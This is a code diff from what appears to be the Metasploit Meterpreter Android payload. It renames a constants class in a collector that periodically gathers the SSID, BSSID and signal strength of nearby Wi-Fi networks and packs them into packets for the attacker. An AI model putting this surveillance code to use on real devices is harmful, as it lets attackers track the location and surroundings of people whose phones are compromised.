@@ -5,12 +5,10 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 
-import android.net.ConnectivityManager;
 import android.net.wifi.ScanResult;
-import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 
-import com.metasploit.meterpreter.android.interval_collect;
+import com.metasploit.meterpreter.android.android_interval_collect;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
@@ -227,19 +225,19 @@ public class WifiCollector extends IntervalCollector {
             TLVPacket resultSet = new TLVPacket();
 
             try {
-                resultSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_TIMESTAMP, timestamp / 1000);
+                resultSet.add(android_interval_collect.TLV_TYPE_COLLECT_RESULT_TIMESTAMP, timestamp / 1000);
                 for (int i = 0; i < scanResults.size(); ++i) {
                     WifiResult result = scanResults.get(i);
                     TLVPacket wifiSet = new TLVPacket();
 
-                    wifiSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_SSID, result.getSsid());
-                    wifiSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_BSSID, result.getBssid());
+                    wifiSet.add(android_interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_SSID, result.getSsid());
+                    wifiSet.add(android_interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_BSSID, result.getBssid());
                     // level is negative, but it'll be converted to positive on the flip side.
-                    wifiSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_LEVEL, Math.abs(result.getLevel()));
+                    wifiSet.add(android_interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI_LEVEL, Math.abs(result.getLevel()));
 
-                    resultSet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI, wifiSet);
+                    resultSet.addOverflow(android_interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI, wifiSet);
                 }
-                packet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_GROUP, resultSet);
+                packet.addOverflow(android_interval_collect.TLV_TYPE_COLLECT_RESULT_GROUP, resultSet);
             }
             catch (IOException ex) {
                 // not good, but not much we can do here
